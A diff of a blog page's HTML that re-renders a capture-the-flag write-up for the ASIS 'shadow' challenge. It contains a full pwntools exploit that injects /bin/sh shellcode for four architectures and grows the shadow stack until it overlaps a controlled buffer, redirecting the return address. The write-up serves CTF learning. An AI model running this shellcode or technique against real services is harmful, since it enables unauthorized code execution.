@@ -286,105 +286,103 @@ In the main function the program first ask us to input our name (the buffer was 
 
 <p>And how’s that gonna help us to exploit the service? Well, first of all we know that the <code class="highlighter-rouge">malloc</code> function in libc will call <code class="highlighter-rouge">mmap</code> instead for the large size memory allocation ( over 0x20000 bytes). Since the add beer function use <code class="highlighter-rouge">malloc</code> to allocate memory for our beer description, we could try to create a super long beer description. This will make <code class="highlighter-rouge">malloc</code> call <code class="highlighter-rouge">mmap</code> instead, and the allocated memory page <strong>will be placed just right before the last mmap memory page, which is the shadow stack.</strong> If we can make the shadow stack keep “growing up”, <strong>it will eventually overlapped with the memory page of our beer description</strong>. Since we can control (modify) the beer description, we can then modify the saved return address and change it to the <code class="highlighter-rouge">name</code> buffer, which we input our shellcode instead.</p>
 
-<p>```python exp_shadow.py
-#!/usr/bin/env python</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
 
-<p>from pwn import *
-import subprocess
-import sys
-import time</p>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
 
-<p>HOST = “shadow.asis-ctf.ir”
-PORT = 31337
-ELF_PATH = “./shadow”</p>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"shadow.asis-ctf.ir"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">31337</span>
+<span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./shadow"</span>
 
-<h1 id="setting">setting</h1>
-<p>context.arch = ‘i386’
-context.os = ‘linux’
-context.endian = ‘little’
-context.word_size = 32
-context.log_level = ‘INFO’</p>
+<span class="c"># setting </span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
 
-<p>elf = ELF(ELF_PATH)</p>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
 
-<p>def my_recvuntil(s, delim):
-    res = “”
-    while delim not in res:
-        c = s.recv(1)
-        res += c
-        sys.stdout.write(c)
-        sys.stdout.flush()
-    return res</p>
+<span class="k">def</span> <span class="nf">my_recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">delim</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">while</span> <span class="n">delim</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">res</span> <span class="o">+=</span> <span class="n">c</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">res</span>
 
-<p>def myexec(cmd):
-    return subprocess.check_output(cmd, shell=True)</p>
+<span class="k">def</span> <span class="nf">myexec</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
 
-<p>def sc(arch=context.arch):
-    if arch == “i386”:
-        # shellcraft.i386.linux.sh(), null free, 22 bytes
-        return “\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x6a\x0e\x58\x48\x48\x48\x99\xcd\x80”
-    elif arch == “amd64”:
-        # shellcraft.amd64.linux.sh(), null free, 24 bytes
-        return “\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05”
-    elif arch == “arm”:
-        # null free, 27 bytes
-        return “\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x09\x30\x49\x40\x52\x40\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68”
-    elif arch == “aarch64”:
-        # 4 null bytes, total 35 bytes
-        return “\x06\x00\x00\x14\xe0\x03\x1e\xaa\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xa8\x1b\x80\xd2\x21\x00\x00\xd4\xfb\xff\xff\x97\x2f\x62\x69\x6e\x2f\x73\x68”
-    else:
-        return None</p>
+<span class="k">def</span> <span class="nf">sc</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">arch</span> <span class="o">==</span> <span class="s">"i386"</span><span class="p">:</span>
+        <span class="c"># shellcraft.i386.linux.sh(), null free, 22 bytes</span>
+        <span class="k">return</span> <span class="s">"</span><span class="se">\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x6a\x0e\x58\x48\x48\x48\x99\xcd\x80</span><span class="s">"</span>
+    <span class="k">elif</span> <span class="n">arch</span> <span class="o">==</span> <span class="s">"amd64"</span><span class="p">:</span>
+        <span class="c"># shellcraft.amd64.linux.sh(), null free, 24 bytes</span>
+        <span class="k">return</span> <span class="s">"</span><span class="se">\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05</span><span class="s">"</span>
+    <span class="k">elif</span> <span class="n">arch</span> <span class="o">==</span> <span class="s">"arm"</span><span class="p">:</span>
+        <span class="c"># null free, 27 bytes</span>
+        <span class="k">return</span> <span class="s">"</span><span class="se">\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x09\x30\x49\x40\x52\x40\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68</span><span class="s">"</span>
+    <span class="k">elif</span> <span class="n">arch</span> <span class="o">==</span> <span class="s">"aarch64"</span><span class="p">:</span>
+        <span class="c"># 4 null bytes, total 35 bytes</span>
+        <span class="k">return</span> <span class="s">"</span><span class="se">\x06\x00\x00\x14\xe0\x03\x1e\xaa\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xa8\x1b\x80\xd2\x21\x00\x00\xd4\xfb\xff\xff\x97\x2f\x62\x69\x6e\x2f\x73\x68</span><span class="s">"</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">None</span>
 
-<p>def add_one(size, desr):
-    r.sendline(“1”)
-    log.info(“send desc length”)
-    r.sendlineafter(“length?\n”, str(size))
-    log.info(“send desc”)
-    r.send(desr)</p>
+<span class="k">def</span> <span class="nf">add_one</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">desr</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"send desc length"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"length?</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"send desc"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">desr</span><span class="p">)</span>
 
-<p>if <strong>name</strong> == “<strong>main</strong>”:</p>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    
+    <span class="n">shellcode_addr</span> <span class="o">=</span> <span class="mh">0x0804a520</span>
+    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">sc</span><span class="p">()</span>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shellcode_addr = 0x0804a520
-shellcode = sc()
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="c">#r = process(ELF_PATH)</span>
 
-r = remote(HOST, PORT)
-#r = process(ELF_PATH)
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"send name (shellcode)"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"name?</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"it?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 
-log.info("send name (shellcode)")
-r.sendlineafter("name?\n", shellcode)
-r.recvuntil("it?\n")
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"add one beer"</span><span class="p">)</span>
+    <span class="n">add_one</span><span class="p">(</span><span class="mh">0x20000</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x20000</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="s">"BBBB"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"beer uploaded to the memory!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"0</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"add beer done"</span><span class="p">)</span>
 
-log.info("add one beer")
-add_one(0x20000, "A"*(0x20000-4)+"BBBB")
-r.recvuntil("beer uploaded to the memory!\n")
-r.recvuntil("0\n")
-log.info("add beer done")
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"choose desc"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span> <span class="c"># choose desc</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"0"</span><span class="p">)</span> <span class="c"># input index</span>
 
-log.info("choose desc")
-r.sendline("2") # choose desc
-r.sendline("0") # input index
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"recieving BBBB"</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"BBBB"</span><span class="p">)</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"recieving rest output"</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"start stacking stack"</span><span class="p">)</span>
 
-log.info("recieving BBBB")
-print r.recvuntil("BBBB")
-log.info("recieving rest output")
-print r.recvuntil("\n")
-print r.recvline()
-log.info("start stacking stack")
+    <span class="n">maxx</span> <span class="o">=</span> <span class="mi">80000</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="n">maxx</span><span class="p">):</span>
+        <span class="n">check</span> <span class="o">=</span> <span class="n">i</span><span class="o">%</span> <span class="mi">10000</span>
+        <span class="k">if</span> <span class="n">check</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="k">print</span> <span class="n">i</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"z"</span><span class="p">)</span>
 
-maxx = 80000
-for i in xrange(maxx):
-    check = i% 10000
-    if check == 0:
-        print i
-    r.sendline("z")
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'y'</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="mh">0x20000</span><span class="o">/</span><span class="mi">4</span><span class="p">))</span>
 
-r.sendline('y')
-r.send(p32(shellcode_addr)*(0x20000/4))
+    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 
-r.interactive()
 </code></pre></div></div>
-
-<p>```</p>
 
 <p>After I finshed my exploit, I found that it will timeout due to the crappy internet connection, so I have to upload my exploit to trello and ask my teammate <strong>freetsubasa</strong> to send the payload for me XD<br />
 Anyway the flag is: <code class="highlighter-rouge">ASIS{732f9beb138dbca4e44d5d184c3074dc}</code></p>
